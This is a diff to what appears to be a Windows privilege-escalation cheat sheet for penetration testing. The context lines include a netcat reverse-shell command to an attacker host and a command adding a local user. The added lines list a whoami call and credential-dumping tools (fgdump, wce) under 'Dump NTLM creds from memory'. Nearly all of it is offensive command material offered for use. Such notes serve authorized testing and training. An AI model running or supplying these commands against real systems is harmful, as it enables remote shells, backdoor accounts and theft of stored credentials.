@@ -74,6 +74,10 @@ $ nc.exe attacker_ip attacker_port -e cmd.exe
 [Back](#summary)
 
 ## Useful commands
+* whoami
+```
+C:\WINDOWS\system32\whoami.exe
+```
 * Add a new user
 ```
 $ net user test 1234 /add
@@ -427,6 +431,13 @@ accesschk.exe -uwcqv "Authenticated Users" C:\*.* /accepteula
 	$ netsh firewall show state
 	$ netsh firewall show config
 	```
+- Dump NTLM creds from memory
+```
+fgdump.exe
+
+wce32.exe -w
+wce64.exe -2
+```
 
 - Look at original low priv exploit code, might have clues as to how to privesc
 
